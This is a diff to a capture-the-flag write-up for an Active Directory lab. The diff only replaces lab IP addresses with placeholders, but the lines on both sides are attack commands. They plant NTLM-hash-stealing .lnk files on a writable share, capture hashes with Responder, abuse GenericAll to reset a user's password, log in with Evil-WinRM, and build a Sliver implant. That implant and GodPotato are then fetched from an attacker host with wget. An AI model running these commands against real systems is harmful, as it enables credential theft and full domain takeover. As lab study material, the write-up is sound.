@@ -53,7 +53,7 @@ nxc smb hack.smarter -u "" -p "" --shares
 ```
 
 ```
-SMB  10.1.145.243  445  DC01  Share  READ,WRITE
+SMB  <DC_IP>  445  DC01  Share  READ,WRITE
 ```
 
 The `Share` share has **READ/WRITE** access for unauthenticated users — a foothold for hash capture.
@@ -67,7 +67,7 @@ With write access to a share, we can plant a malicious `.lnk` file. When a user 
 ### Step 1 — Generate the malicious files
 
 ```bash
-ntlm_theft.py --verbose --generate modern --server 10.200.59.205 --filename "meetingXYZ"
+ntlm_theft.py --verbose --generate modern --server <ATTACKER_IP> --filename "meetingXYZ"
 ```
 
 This creates several file types. The `.lnk` is the most reliable for "browse to folder" capture.
@@ -75,13 +75,13 @@ This creates several file types. The `.lnk` is the most reliable for "browse to 
 ### Step 2 — Start Responder
 
 ```bash
-sudo responder -I tun0 -wv
+sudo responder -I <INTERFACE> -wv
 ```
 
 ### Step 3 — Upload the `.lnk` to the writable share
 
 ```bash
-smbclient //10.1.145.243/Share -N -c 'put meetingXYZ/meetingXYZ.lnk meetingXYZ.lnk'
+smbclient //<DC_IP>/Share -N -c 'put meetingXYZ/meetingXYZ.lnk meetingXYZ.lnk'
 ```
 
 ### Step 4 — Capture the hash
@@ -131,7 +131,7 @@ No GPP credentials found — moving to BloodHound.
 Collect BloodHound data using `bob.ross`:
 
 ```bash
-nxc ldap dc01.hack.smarter -u 'bob.ross' -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.145.243
+nxc ldap dc01.hack.smarter -u 'bob.ross' -p 'REDACTED' --bloodhound --collection All --dns-server <DC_IP>
 ```
 
 **Key finding:** `bob.ross` has **GenericAll** over `alice.wonderland`.
@@ -151,13 +151,13 @@ GenericAll grants full control over an object — including the ability to **cha
 ### Step 1 — Force-change Alice's password using GenericAll
 
 ```bash
-bloodyAD -u 'bob.ross' -p 'REDACTED' -d hack.smarter -H 10.1.145.243 set password alice.wonderland 'NewPass123!'
+bloodyAD -u 'bob.ross' -p 'REDACTED' -d hack.smarter -H <DC_IP> set password alice.wonderland 'NewPass123!'
 ```
 
 ### Step 2 — Connect via Evil-WinRM
 
 ```bash
-evil-winrm -i 10.1.145.243 -u 'alice.wonderland' -p 'NewPass123!'
+evil-winrm -i <DC_IP> -u 'alice.wonderland' -p 'NewPass123!'
 ```
 
 ```
@@ -216,7 +216,7 @@ sliver-server
 ### Step 2 — Generate an mTLS implant
 
 ```bash
-[server] sliver > generate --mtls 10.200.59.205:443 --save /home/jhaxx/CTFs/HackSmarter/ShareThePain/files
+[server] sliver > generate --mtls <ATTACKER_IP>:443 --save /home/jhaxx/CTFs/HackSmarter/ShareThePain/files
 ```
 
 Output: `MAGNIFICENT_POLISH.exe`
@@ -228,13 +228,13 @@ Output: `MAGNIFICENT_POLISH.exe`
 python -m http.server 80
 
 # Target — download it
-*Evil-WinRM* PS C:\users\alice.wonderland\desktop> wget http://10.200.59.205/MAGNIFICENT_POLISH.exe -OutFile MAGNIFICENT_POLISH.exe
+*Evil-WinRM* PS C:\users\alice.wonderland\desktop> wget http://<ATTACKER_IP>/MAGNIFICENT_POLISH.exe -OutFile MAGNIFICENT_POLISH.exe
 ```
 
 ### Step 4 — Start mTLS listener and execute implant
 
 ```bash
-[server] sliver > mtls --lhost 10.200.59.205 --lport 443
+[server] sliver > mtls --lhost <ATTACKER_IP> --lport 443
 ```
 
 ```bash
@@ -244,7 +244,7 @@ python -m http.server 80
 Session connects back:
 
 ```
-[*] Session 92dda2de MAGNIFICENT_POLISH - 10.1.145.243:50191 (DC01) - HACK\alice.wonderland
+[*] Session 92dda2de MAGNIFICENT_POLISH - <DC_IP>:50191 (DC01) - HACK\alice.wonderland
 ```
 
 ### Step 5 — Start SOCKS5 proxy
@@ -326,7 +326,7 @@ nt service\mssql$sqlexpress
 Transfer to `C:\Temp\` via the `alice.wonderland` Evil-WinRM session:
 
 ```bash
-*Evil-WinRM* PS C:\Temp> wget http://10.200.59.205/GodPotato-NET4.exe -OutFile godpotato.exe
+*Evil-WinRM* PS C:\Temp> wget http://<ATTACKER_IP>/GodPotato-NET4.exe -OutFile godpotato.exe
 ```
 
 ### Step 2 — Verify SYSTEM execution
